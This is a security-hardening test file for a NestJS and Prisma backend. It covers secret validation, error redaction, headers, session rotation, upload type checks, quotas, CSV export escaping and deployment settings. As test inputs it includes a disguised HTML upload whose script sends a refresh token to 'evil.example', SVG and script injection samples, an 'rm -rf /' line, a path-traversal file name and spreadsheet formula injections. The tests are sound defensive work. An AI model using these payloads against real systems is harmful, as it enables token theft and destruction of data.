// Security hardening tests: data exposure, start-up validation, error output, headers, uploads, quotas, deployment files.
// Run with: npm --workspace back test. No database is needed: Prisma is replaced by in-memory fakes.
import 'reflect-metadata';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { BadRequestException, HttpException } from '@nestjs/common';
import { ActivityService } from '../src/activity/activity.service';
import { SystemController } from '../src/system/system.controller';
import { RemindersController } from '../src/reminders/reminders.controller';
import { csvCell } from '../src/exports/exports.controller';
import { isRealInstallation, looksLikePlaceholder, secretProblem, trustProxyHops, validateEnvironment } from '../src/config.validation';
import { AllExceptionsFilter, INTERNAL_ERROR, clientError } from '../src/common/http-exception.filter';
import { allowedOrigins, apiSecurityHeaders, hstsEnabled, listenHost } from '../src/common/security';
import { checkUpload, detectFileType, safeDisplayName } from '../src/common/upload-content';
import { portalLimits, uploadRefusal } from '../src/portal/portal-limits';
import { REFRESH_REUSE_GRACE_MS, refreshDecision, ttlMs } from '../src/auth/sessions';

type Row = Record<string, any>;
const ROOT = join(__dirname, '..', '..');
const read = (...parts: string[]) => readFileSync(join(ROOT, ...parts), 'utf8');
const status = (code: number, message?: RegExp) => (e: any) => e.status === code && (!message || message.test(e.message));

// ---------- /api/activity ----------

// Applies a Prisma `select` / `include` the way the database would: what is not selected is not returned.
function project(row: Row, shape: Row | true | undefined): Row {
  if (!shape || shape === true) return { ...row };
  if (shape.select) return Object.fromEntries(Object.keys(shape.select).filter(k => shape.select[k]).map(k => [k, row[k]]));
  return { ...row };
}
function activityWorld() {
  const user = { id: 'u1', email: 'alice@example.com', displayName: 'Alice', role: 'ADMIN', organizationId: 'org-1', passwordHash: '$2b$12$abcdefghijklmnopqrstuv', tokenVersion: 3, passwordChangedAt: new Date(), createdAt: new Date(), updatedAt: new Date() };
  const projectRow = { id: 'p1', name: 'Résidence', organizationId: 'org-1', address: '1 rue du Test', status: 'ACTIVE' };
  const rows: Row[] = [
    { id: 'a1', action: 'Projet créé', entityType: 'Project', userId: 'u1', projectId: 'p1' },
    { id: 'a2', action: 'Connexion', entityType: 'Session', userId: 'u1', projectId: null, metadata: { ip: '203.0.113.9' } },
    { id: 'a3', action: 'Réponse entreprise reçue via le portail', entityType: null, userId: null, projectId: 'p1' },
  ];
  let lastWhere: Row = {};
  const prisma = { activityLog: { findMany: async ({ where, include }: any) => {
    lastWhere = where;
    const hidden = (where.AND || []).length > 0; // the non-administrator filter
    return rows.filter(r => !(hidden && r.entityType === 'Session')).map(r => ({ ...r, user: r.userId ? project(user, include.user) : null, project: r.projectId ? project(projectRow, include.project) : null }));
  } } };
  return { service: new ActivityService(prisma as any), where: () => lastWhere };
}

test('/api/activity never returns an account record: no password hash, token version or password date', async () => {
  const { service } = activityWorld();
  for (const role of ['ADMIN', 'EDITOR', 'USER']) {
    const list: Row[] = await service.list('org-1', undefined, role);
    const json = JSON.stringify(list);
    for (const forbidden of ['passwordHash', '$2b$', 'tokenVersion', 'passwordChangedAt', 'organizationId":"org-1","passwordHash']) assert.ok(!json.includes(forbidden), `${role}: ${forbidden}`);
    const withUser = list.find(a => a.user)!;
    assert.deepEqual(Object.keys(withUser.user).sort(), ['displayName', 'email', 'id'], 'only what the page shows');
    assert.deepEqual(Object.keys(list.find(a => a.project)!.project).sort(), ['id', 'name']);
  }
});

test('sign-in events are listed for administrators only; entries without a type stay visible to everyone', async () => {
  const { service, where } = activityWorld();
  assert.ok((await service.list('org-1', undefined, 'ADMIN')).some((a: Row) => a.entityType === 'Session'));
  for (const role of ['EDITOR', 'USER', undefined]) {
    const list: Row[] = await service.list('org-1', undefined, role);
    assert.ok(!list.some(a => a.entityType === 'Session'), String(role));
    assert.ok(list.some(a => a.entityType === null), 'a plain NOT would also drop entries whose type is empty');
    assert.deepEqual(where().AND, [{ OR: [{ entityType: null }, { entityType: { not: 'Session' } }] }]);
  }
});

// ---------- start-up validation ----------

const STRONG = { a: 'q7Vd2mXw9Lk4Rt8Zp3Hn6Bs1Yc5Jf0GuEaTiOxWz', b: 'M3nB8vC1xZ6lK9jH2gF5dS4aP7oI0uY3tR6eW9qL', c: 'Zx9Cv8Bn7Ml6Kj5Hg4Fd3Sa2Po1Iu0YtRe9Wq8Tz', d: 'Hy6Tg5Rf4Ed3Ws2Qa1Zx0Cv9Bn8Ml7Kj6Ih5Ug4' };
const production = (extra: Row = {}): Row => ({ NODE_ENV: 'production', DATABASE_URL: 'postgresql://sowen:Xk29fjQ02mvPq84nzLw7@postgres:5432/sowen', JWT_ACCESS_SECRET: STRONG.a, JWT_REFRESH_SECRET: STRONG.b, PORTAL_TOKEN_SECRET: STRONG.c, PUBLIC_APP_URL: 'https://app.example.com', TRUST_PROXY: '1', ...extra });
const quiet = () => {};

test('production refuses the example secrets of the repository', () => {
  const examples = [...read('back', '.env.example').matchAll(/^(JWT_ACCESS_SECRET|JWT_REFRESH_SECRET)="([^"]+)"/gm)].map(m => [m[1], m[2]]);
  assert.equal(examples.length, 2, 'the example file still documents both secrets');
  for (const [name, value] of examples) {
    assert.ok(looksLikePlaceholder(value), `${name} example is recognised`);
    assert.throws(() => validateEnvironment(production({ [name]: value }), quiet), new RegExp(`Unsafe secret.*${name} is an example or placeholder value`));
  }
  for (const value of ['CHANGE_ME_LONG_RANDOM_SECRET', 'CHANGE_ME_ANOTHER_LONG_RANDOM_SECRET', 'CHANGE_ME_WITH_A_LONG_RANDOM_VALUE', 'CHANGE_ME_CRON_SECRET', 'changeme-changeme-changeme-changeme', 'your-secret-key-goes-here-0123456789', 'example-secret-example-secret-0123']) assert.ok(looksLikePlaceholder(value), value);
  assert.ok(!looksLikePlaceholder(STRONG.a));
});

test('production requires long, random and distinct secrets for the JWTs and the portal', () => {
  assert.doesNotThrow(() => validateEnvironment(production(), quiet));
  assert.throws(() => validateEnvironment(production({ JWT_ACCESS_SECRET: 'only-28-characters-long-abcd' }), quiet), /JWT_ACCESS_SECRET must contain at least 32 characters/);
  assert.throws(() => validateEnvironment(production({ JWT_REFRESH_SECRET: 'abababababababababababababababababababab' }), quiet), /JWT_REFRESH_SECRET is not random enough/);
  assert.throws(() => validateEnvironment(production({ PORTAL_TOKEN_SECRET: 'CHANGE_ME_PORTAL_TOKEN_SECRET_VALUE' }), quiet), /PORTAL_TOKEN_SECRET is an example or placeholder value/);
  assert.throws(() => validateEnvironment(production({ PORTAL_TOKEN_SECRET: '' }), quiet), /PORTAL_TOKEN_SECRET must be configured/);
  assert.throws(() => validateEnvironment(production({ JWT_REFRESH_SECRET: STRONG.a }), quiet), /must be different/);
  assert.throws(() => validateEnvironment(production({ PORTAL_TOKEN_SECRET: STRONG.b }), quiet), /must be different/);
  assert.equal(secretProblem(STRONG.d), null);
  // the error names the variable, never its value
  try { validateEnvironment(production({ JWT_ACCESS_SECRET: 'CHANGE_ME_LONG_RANDOM_SECRET' }), quiet); assert.fail('accepted'); } catch (e: any) { assert.ok(!e.message.includes('CHANGE_ME_LONG_RANDOM_SECRET')); }
});

test('CRON_SECRET is validated only when it is set: empty keeps the external endpoint disabled', () => {
  assert.doesNotThrow(() => validateEnvironment(production({ CRON_SECRET: '' }), quiet));
  assert.doesNotThrow(() => validateEnvironment(production({ CRON_SECRET: STRONG.d }), quiet));
  assert.throws(() => validateEnvironment(production({ CRON_SECRET: 'CHANGE_ME_CRON_SECRET' }), quiet), /CRON_SECRET is an example or placeholder value/);
  assert.throws(() => validateEnvironment(production({ CRON_SECRET: 'short' }), quiet), /CRON_SECRET must contain at least 32 characters/);
  assert.throws(() => validateEnvironment(production({ CRON_SECRET: STRONG.a }), quiet), /CRON_SECRET must be different/);
});

test('production refuses the development database password, a non-https public address and a malformed TRUST_PROXY', () => {
  assert.throws(() => validateEnvironment(production({ DATABASE_URL: 'postgresql://sowen:sowen_dev_password@postgres:5432/sowen' }), quiet), /development database password/);
  assert.throws(() => validateEnvironment(production({ PUBLIC_APP_URL: 'http://app.example.com' }), quiet), /must start with https/);
  // a developer's machine with a tunnel (public address, not production) keeps its local database
  assert.doesNotThrow(() => validateEnvironment(production({ NODE_ENV: '', DATABASE_URL: 'postgresql://sowen:sowen_dev_password@localhost:5432/sowen' }), quiet));
  for (const bad of ['true', 'yes', '1,2', 'loopback', '-1', '99']) assert.throws(() => validateEnvironment(production({ TRUST_PROXY: bad }), quiet), /TRUST_PROXY/, bad);
  const warnings: string[] = [];
  validateEnvironment(production({ TRUST_PROXY: '' }), m => warnings.push(m));
  assert.match(warnings.join(' '), /TRUST_PROXY is empty in production/);
});

test('a public address makes the installation a real one; local development only gets a warning for example secrets', () => {
  assert.ok(isRealInstallation({ NODE_ENV: 'production' }));
  assert.ok(isRealInstallation({ PUBLIC_APP_URL: 'https://x.example' }));
  assert.ok(!isRealInstallation({ NODE_ENV: 'development', PUBLIC_APP_URL: '' }));
  const dev = { DATABASE_URL: 'postgresql://sowen:sowen_dev_password@localhost:5432/sowen', JWT_ACCESS_SECRET: 'CHANGE_ME_LONG_RANDOM_SECRET', JWT_REFRESH_SECRET: 'CHANGE_ME_ANOTHER_LONG_RANDOM_SECRET', CRON_SECRET: 'CHANGE_ME_CRON_SECRET' };
  const warnings: string[] = [];
  assert.doesNotThrow(() => validateEnvironment(dev, m => warnings.push(m)));
  assert.equal(warnings.length, 3);
  assert.ok(warnings.every(w => !w.includes('CHANGE_ME')), 'warnings name the variable, not the value');
  // the same file with a public address is refused
  assert.throws(() => validateEnvironment({ ...dev, PUBLIC_APP_URL: 'https://tunnel.example', PORTAL_TOKEN_SECRET: STRONG.c }, quiet), /Unsafe secret/);
});

// ---------- error output ----------

test('an internal error gives the client a generic message and a reference: no Prisma text, path or stack', () => {
  const prismaError = Object.assign(new Error('\nInvalid `this.prisma.document.create()` invocation in\nC:\\app\\back\\dist\\src\\documents\\documents.service.js:35:52\n\n  32 await this.assertProject(projectId)\nInvalid value for argument `type`. Expected DocumentType.'), { code: 'P2009', clientVersion: '6.19.3' });
  const out = clientError(prismaError, () => 'ref-1');
  assert.deepEqual(out, { status: 500, body: { statusCode: 500, message: INTERNAL_ERROR, errorId: 'ref-1' }, internal: true });
  const sent: Row = {};
  const filter = new AllExceptionsFilter();
  const logged: string[] = [];
  (filter as any).logger = { error: (...a: any[]) => logged.push(a.join(' ')), warn: () => {} };
  filter.catch(prismaError, { switchToHttp: () => ({ getResponse: () => ({ status: (code: number) => ({ json: (body: Row) => Object.assign(sent, { code, body }) }) }), getRequest: () => ({ method: 'POST', url: '/api/documents/upload?projectId=1' }) }) } as any);
  const json = JSON.stringify(sent.body);
  assert.equal(sent.code, 500);
  for (const leaked of ['prisma', 'Prisma', 'documents.service', 'C:\\\\', 'dist', 'invocation', 'DocumentType', 'stack', 'P2009']) assert.ok(!json.includes(leaked), leaked);
  assert.equal(sent.body.message, INTERNAL_ERROR);
  assert.match(sent.body.errorId, /^[0-9a-f-]{36}$/);
  // the details are kept for the administrator, under the same reference
  assert.ok(logged[0].includes(sent.body.errorId) && logged[0].includes('documents.service'));
  for (const thrown of [new TypeError("Cannot read properties of undefined (reading 'id')"), 'a string', null, { message: 'ECONNREFUSED 10.0.0.5:5432' }]) assert.equal(clientError(thrown).body.message, INTERNAL_ERROR);
});

test('deliberate errors keep their message; malformed and oversized requests get 400 / 413, not 500', () => {
  assert.deepEqual(clientError(new BadRequestException('Le message est obligatoire.')).body, { statusCode: 400, message: 'Le message est obligatoire.' });
  assert.equal(clientError(new HttpException('Trop de tentatives.', 429)).status, 429);
  const tooLarge = Object.assign(new Error('request entity too large'), { status: 413, type: 'entity.too.large' });
  assert.deepEqual(clientError(tooLarge), { status: 413, body: { statusCode: 413, message: 'Requête trop volumineuse.' }, internal: false });
  const badJson = Object.assign(new SyntaxError('Unexpected token } in JSON at position 12'), { statusCode: 400 });
  assert.deepEqual(clientError(badJson).body, { statusCode: 400, message: 'Requête invalide.' });
  assert.equal(clientError(Object.assign(new Error('x'), { status: 502 })).status, 500, 'only client errors keep their status');
});

// ---------- headers, origins and the listening address ----------

test('API responses carry nosniff, no-referrer, frame protection and a locked-down policy; HSTS only in production over https', () => {
  const headers = apiSecurityHeaders({});
  assert.equal(headers['X-Content-Type-Options'], 'nosniff');
  assert.equal(headers['Referrer-Policy'], 'no-referrer');
  assert.equal(headers['X-Frame-Options'], 'DENY');
  assert.match(headers['Content-Security-Policy'], /default-src 'none'.*frame-ancestors 'none'/);
  assert.equal(headers['Strict-Transport-Security'], undefined);
  assert.equal(apiSecurityHeaders({ NODE_ENV: 'production', PUBLIC_APP_URL: 'https://app.example.com' })['Strict-Transport-Security'], 'max-age=31536000');
  assert.ok(!hstsEnabled({ NODE_ENV: 'production', PUBLIC_APP_URL: 'http://app.example.com' }));
  assert.ok(!hstsEnabled({ NODE_ENV: 'development', PUBLIC_APP_URL: 'https://app.example.com' }));
  const main = read('back', 'src', 'main.ts');
  assert.match(main, /app\.disable\('x-powered-by'\)/);
  assert.match(main, /apiSecurityHeaders\(env\)/);
});

test('only the configured web origins may call the API from a browser', () => {
  assert.deepEqual(allowedOrigins({}), ['http://localhost:3000']);
  assert.deepEqual(allowedOrigins({ WEB_URL: 'https://app.example.com/, https://other.example.com' }), ['https://app.example.com', 'https://other.example.com']);
});

test('TRUST_PROXY: the API stops listening on public interfaces as soon as a proxy is trusted', () => {
  assert.equal(trustProxyHops(''), 0);
  assert.equal(trustProxyHops('1'), 1);
  assert.equal(trustProxyHops('true'), 0, 'not a number: validation refuses it at start-up');
  assert.equal(listenHost({}), '0.0.0.0');
  assert.equal(listenHost({ TRUST_PROXY: '1' }), '127.0.0.1', 'a client reaching the API directly could forge X-Forwarded-For');
  assert.equal(listenHost({ TRUST_PROXY: '1', API_HOST: '0.0.0.0' }), '0.0.0.0', 'explicit choice (container whose port is published on 127.0.0.1)');
});

// ---------- sessions ----------

test('refresh tokens: the current one rotates, the one just replaced is tolerated briefly, an older one ends the session', () => {
  const now = new Date('2026-10-04T10:00:00Z');
  const session = { refreshId: 'r2', previousRefreshId: 'r1', rotatedAt: new Date(now.getTime() - 5000), revokedAt: null, expiresAt: new Date(now.getTime() + 86400000) };
  assert.equal(refreshDecision(session, 'r2', now), 'ROTATE');
  assert.equal(refreshDecision(session, 'r1', now), 'REPEAT', 'two tabs renewing at the same moment');
  assert.equal(refreshDecision({ ...session, rotatedAt: new Date(now.getTime() - REFRESH_REUSE_GRACE_MS - 1) }, 'r1', now), 'REUSED');
  assert.equal(refreshDecision(session, 'r0', now), 'REUSED');
  assert.equal(refreshDecision(session, undefined, now), 'REUSED');
  assert.equal(refreshDecision({ ...session, revokedAt: now }, 'r2', now), 'DEAD');
  assert.equal(refreshDecision({ ...session, expiresAt: now }, 'r2', now), 'DEAD');
  assert.equal(ttlMs('30d', 1), 30 * 86400000);
  assert.equal(ttlMs('15m', 1), 900000);
  assert.equal(ttlMs('3600', 1), 3600000);
  assert.equal(ttlMs('', 42), 42);
  assert.equal(ttlMs('soon', 42), 42);
});

// ---------- uploads ----------

const PDF = Buffer.from('%PDF-1.7\n1 0 obj\n<<>>\nendobj\n');
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]), Buffer.from('JFIF\0 padding padding')]);
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(16)]);
const upload = (name: string, mimetype: string, buffer: Buffer) => ({ originalname: name, mimetype, buffer, size: buffer.length }) as any;

test('the content of a file decides its type', () => {
  assert.equal(detectFileType(PDF)!.mime, 'application/pdf');
  assert.equal(detectFileType(JPEG)!.mime, 'image/jpeg');
  assert.equal(detectFileType(PNG)!.mime, 'image/png');
  assert.equal(detectFileType(Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBPVP8 ')]))!.mime, 'image/webp');
  assert.equal(detectFileType(Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WAVEfmt ')]))!.mime, 'audio/wav');
  assert.equal(detectFileType(Buffer.concat([Buffer.alloc(4), Buffer.from('ftypM4A '), Buffer.alloc(8)]))!.mime, 'audio/mp4');
  assert.equal(detectFileType(Buffer.concat([Buffer.from('ID3'), Buffer.alloc(16)]))!.mime, 'audio/mpeg');
  for (const other of ['<html><script>alert(1)</script></html>', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', '<?xml version="1.0"?><x/>', 'MZ\x90\x00 an executable', 'PK\x03\x04 a zip or office file', '#!/bin/sh\nrm -rf /', '   %PDF-1.4 not at the start', 'short']) assert.equal(detectFileType(Buffer.from(other, 'latin1')), null, other.slice(0, 20));
});

test('HTML, SVG or scripts disguised as a PDF or an image are refused, whatever name and type they announce', () => {
  const html = Buffer.from('<html><body><script>fetch("//evil.example/"+localStorage.sowen_refresh_token)</script></body></html>');
  for (const [name, mime] of [['rapport.pdf', 'application/pdf'], ['photo.jpg', 'image/jpeg'], ['photo.png', 'image/png'], ['page.html', 'application/pdf']]) {
    assert.throws(() => checkUpload(upload(name, mime, html), 'general'), status(400, /Type de fichier non pris en charge/), name);
    assert.throws(() => checkUpload(upload(name, mime, html), 'pdf'), status(400, /pas un PDF valide/), name);
  }
  assert.throws(() => checkUpload(upload('image.svg', 'image/png', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>')), 'general'), status(400));
  assert.throws(() => checkUpload(upload('photo.jpg', 'application/pdf', JPEG), 'pdf'), status(400, /pas un PDF valide/), 'a report must be a PDF');
  assert.throws(() => checkUpload(upload('vide.pdf', 'application/pdf', Buffer.alloc(0)), 'general'), status(400));
});

test('a genuine file is accepted; its stored type and extension come from its content', () => {
  const pdf = checkUpload(upload('rapport.pdf', 'application/pdf', PDF), 'general');
  assert.deepEqual([pdf.originalname, pdf.mimetype], ['rapport.pdf', 'application/pdf']);
  // announced as HTML, really a PDF: stored as a PDF, with a PDF extension
  const renamed = checkUpload(upload('page.html', 'text/html', PDF), 'general');
  assert.deepEqual([renamed.originalname, renamed.mimetype], ['page.html.pdf', 'application/pdf']);
  const photo = checkUpload(upload('IMG 0042.JPG', 'application/octet-stream', JPEG), 'general');
  assert.deepEqual([photo.originalname, photo.mimetype], ['IMG 0042.JPG', 'image/jpeg']);
  assert.equal(safeDisplayName('..\\..\\etc\\passwd', { mime: 'application/pdf', extensions: ['pdf'] }), 'passwd.pdf');
  assert.equal(safeDisplayName('a<b>:"c|.pdf', { mime: 'application/pdf', extensions: ['pdf'] }), 'abc.pdf');
});

test('downloads are always sent as attachments', () => {
  const source = read('back', 'src', 'documents', 'documents.service.ts');
  assert.match(source, /disposition: `attachment; filename\*=UTF-8''/);
  assert.doesNotMatch(source, /disposition: `inline/);
});

// ---------- portal quotas ----------

test('portal upload limits: rate per hour, files per observation and total size, with safe defaults', () => {
  const limits = portalLimits({});
  assert.deepEqual(limits, { uploadsPerHour: 20, filesPerObservation: 30, totalBytes: 500 * 1024 * 1024, responsesPerHour: 30 });
  assert.deepEqual(portalLimits({ PORTAL_UPLOADS_PER_HOUR: '5', PORTAL_MAX_FILES_PER_OBSERVATION: '3', PORTAL_MAX_TOTAL_MB: '50', PORTAL_RESPONSES_PER_HOUR: '0' }), { uploadsPerHour: 5, filesPerObservation: 3, totalBytes: 50 * 1024 * 1024, responsesPerHour: 30 });
  const MB = 1024 * 1024;
  assert.equal(uploadRefusal({ uploadsLastHour: 3, filesOnObservation: 3, totalBytes: 40 * MB }, limits, 20 * MB), null, 'ordinary use is not affected');
  assert.equal(uploadRefusal({ uploadsLastHour: 20, filesOnObservation: 0, totalBytes: 0 }, limits)!.status, 429);
  assert.equal(uploadRefusal({ uploadsLastHour: 0, filesOnObservation: 30, totalBytes: 0 }, limits)!.status, 413);
  assert.equal(uploadRefusal({ uploadsLastHour: 0, filesOnObservation: 0, totalBytes: 490 * MB }, limits, 20 * MB)!.status, 413, 'repeated 20 MB files cannot fill the disk');
  assert.equal(uploadRefusal({ uploadsLastHour: 0, filesOnObservation: 0, totalBytes: 480 * MB }, limits, 20 * MB), null);
});

// ---------- cron endpoint, status and exports ----------

test('the external cron endpoint is disabled while CRON_SECRET is empty, and needs the exact secret otherwise', async () => {
  const calls: Row[] = [];
  const service = { scanAll: async (o: Row) => { calls.push(o); return { ran: true }; } };
  const controller = (secret: string) => new RemindersController(service as any, { get: () => secret } as any);
  for (const given of [undefined, '', 'anything', STRONG.d]) assert.throws(() => controller('').cron(given), status(401), 'disabled');
  for (const given of [undefined, '', STRONG.d.slice(0, -1), `${STRONG.d}x`, STRONG.a]) assert.throws(() => controller(STRONG.d).cron(given), status(401), String(given));
  assert.equal(calls.length, 0);
  await controller(STRONG.d).cron(STRONG.d);
  assert.equal(calls.length, 1);
});

test('/api/system/status gives no internal error text, and the sending address only to administrators', async () => {
  const controller = (database: 'ok' | 'down') => new SystemController(
    { get: () => '' } as any,
    { $queryRaw: async () => { if (database === 'down') throw new Error("Can't reach database server at `db.internal:5432` (user sowen)"); return 1; } } as any,
    { isConfigured: () => true, provider: () => 'gmail', sender: () => 'SOWEN <equipe@example.com>' } as any,
    { status: async () => ({ provider: 's3', state: 'error', ok: false, detail: 'bucket sowen-prod: AccessDenied for key AKIAEXAMPLE' }) } as any,
  );
  const user = (role: string) => ({ sub: 'u', email: 'e', role, organizationId: 'o' }) as any;
  const down = await controller('down').status(user('USER'));
  assert.equal(down.database, false);
  assert.ok(!JSON.stringify(down).includes('db.internal') && !('databaseError' in down));
  for (const role of ['USER', 'EDITOR']) {
    const seen = await controller('ok').status(user(role));
    assert.equal(seen.emailSender, null);
    assert.equal(seen.storage.detail, null);
    assert.equal(seen.email, true, 'whether email works is still shown');
  }
  const admin = await controller('ok').status(user('ADMIN'));
  assert.equal(admin.emailSender, 'SOWEN <equipe@example.com>');
  assert.match(admin.storage.detail!, /AccessDenied/);
});

test('CSV exports neutralise cells a spreadsheet would run as a formula', () => {
  for (const cell of ['=HYPERLINK("http://evil.example","x")', '+1+1', '-2+3', '@SUM(A1)', '\tcmd', '\r=1']) assert.equal(csvCell(cell), `'${cell}`, cell);
  for (const cell of ['Réserve à lever', 'Lot 3 - Électricité', '12', '', 'a=b']) assert.equal(csvCell(cell), cell);
  assert.equal(csvCell(null), '');
});

// ---------- deployment files and documentation ----------

test('production compose: PostgreSQL publishes no port, the API and the web application listen on 127.0.0.1 only', () => {
  const compose = read('deploy', 'docker-compose.prod.yml').replace(/^\s*#.*$/gm, '');
  // the block of one service: from its name to the next key at the same or a lower indentation
  const service = (name: string) => { const lines = compose.split(/\r?\n/); const start = lines.findIndex(l => l === `  ${name}:`); assert.ok(start >= 0, name); const end = lines.findIndex((l, i) => i > start && /^( {0,2})\S/.test(l)); return lines.slice(start, end < 0 ? undefined : end).join('\n'); };
  assert.match(service('postgres'), /image: postgres/);
  assert.doesNotMatch(service('postgres'), /ports:/, 'the database is never published');
  const published = [...compose.matchAll(/^\s*-\s*"([^"]*:\d+:\d+)"/gm)].map(m => m[1]);
  assert.deepEqual(published.sort(), ['127.0.0.1:3000:3000', '127.0.0.1:4000:4000']);
  assert.doesNotMatch(compose, /sowen_dev_password/);
  assert.match(compose, /POSTGRES_PASSWORD: \$\{POSTGRES_PASSWORD:\?/, 'no default database password');
  assert.match(service('api'), /TRUST_PROXY: "1"/);
  assert.match(service('api'), /NODE_ENV: production/);
  // the development database is local to the developer's machine too
  assert.match(read('docker-compose.yml'), /"127\.0\.0\.1:5432:5432"/);
  assert.doesNotMatch(read('docker-compose.yml').replace(/^\s*#.*$/gm, ''), /-\s*"5432:5432"/);
});

test('production settings templates contain no usable secret and keep sign-up and the cron endpoint closed', () => {
  const api = read('deploy', 'api', '.env.example');
  for (const name of ['JWT_ACCESS_SECRET', 'JWT_REFRESH_SECRET', 'PORTAL_TOKEN_SECRET', 'CRON_SECRET', 'ANTHROPIC_API_KEY', 'GMAIL_APP_PASSWORD', 'RESEND_API_KEY', 'S3_SECRET_ACCESS_KEY']) assert.match(api, new RegExp(`^${name}=""$`, 'm'), name);
  assert.match(api, /^ALLOW_PUBLIC_REGISTRATION="false"$/m);
  assert.match(read('deploy', '.env.example'), /^POSTGRES_PASSWORD=""$/m);
  assert.match(read('back', '.env.example'), /^CRON_SECRET=""$/m);
  const ignore = read('.gitignore');
  for (const entry of ['deploy/.env', 'deploy/api/.env', 'deploy/backups/']) assert.ok(ignore.includes(entry), entry);
});

test('production documentation uses "prisma migrate deploy" and never recommends "migrate dev"', () => {
  const deployment = read('docs', 'DEPLOYMENT.md');
  assert.match(deployment, /migrate deploy/);
  assert.match(deployment, /Never run `prisma migrate dev`/);
  for (const doc of ['docs/DEPLOYMENT.md', 'docs/BACKUP_RESTORE.md', 'docs/RULES_LIBRARY.md']) {
    const commands = read(...doc.split('/')).split('\n').filter(line => /migrate dev|db:migrate/.test(line) && !/never|jamais/i.test(line));
    assert.deepEqual(commands, [], doc);
  }
  for (const doc of ['README.md', 'docs/PRE_RELEASE_CHECKLIST.md', 'docs/FINAL_TEST_GUIDE.md']) assert.match(read(...doc.split('/')), /db:deploy|migrate deploy/, `${doc} points production to migrate deploy`);
  assert.equal(JSON.parse(read('package.json')).scripts['db:deploy'], 'npm --workspace back run prisma:deploy');
  assert.equal(JSON.parse(read('back', 'package.json')).scripts['prisma:deploy'], 'prisma migrate deploy');
  // the images never run a migration on their own, and never the development command
  for (const file of ['back/Dockerfile', 'deploy/docker-compose.prod.yml']) assert.doesNotMatch(read(...file.split('/')).replace(/^\s*#.*$/gm, ''), /migrate dev/, file);
});

test('the backup procedure sends the database and the documents off the server, and documents a restore test', () => {
  const script = read('deploy', 'backup.sh');
  assert.match(script, /BACKUP_REMOTE:\?/, 'refuses to run without a remote destination');
  assert.match(script, /pg_dump/);
  assert.match(script, /\/app\/back\/uploads/);
  assert.match(script, /rclone copy|rsync -a/);
  const doc = read('docs', 'BACKUP_RESTORE.md');
  for (const expected of [/another location/, /pg_restore/, /## 4\. Restore test/, /PORTAL_TOKEN_SECRET/, /sha256sum -c/]) assert.match(doc, expected);
  assert.ok(existsSync(join(ROOT, 'deploy', 'nginx', 'sowen.conf.example')));
  const nginx = read('deploy', 'nginx', 'sowen.conf.example');
  assert.match(nginx, /\[redacted\]/, 'portal and invitation tokens are masked in the access log');
  assert.match(nginx, /proxy_set_header X-Forwarded-For \$remote_addr;/, 'the visitor cannot supply the forwarded address');
  assert.doesNotMatch(nginx, /proxy_add_x_forwarded_for/);
});
